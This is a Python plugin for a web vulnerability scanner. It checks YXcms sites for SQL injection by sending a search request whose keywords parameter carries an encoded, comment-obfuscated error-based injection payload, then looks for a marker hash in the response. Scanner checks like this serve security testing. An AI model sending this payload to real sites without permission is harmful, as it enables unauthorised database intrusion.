#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "index.php?r=default/index/search&keywords=a%2527)%20and/**/(select/**/1/**/from/**/(select/**/count(*),concat(md5(3333),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)%23&type=all"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('2be9bd7a3434f7038ca27d1918de58bd1')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:YXcmsApp_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:YXcmsApp_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
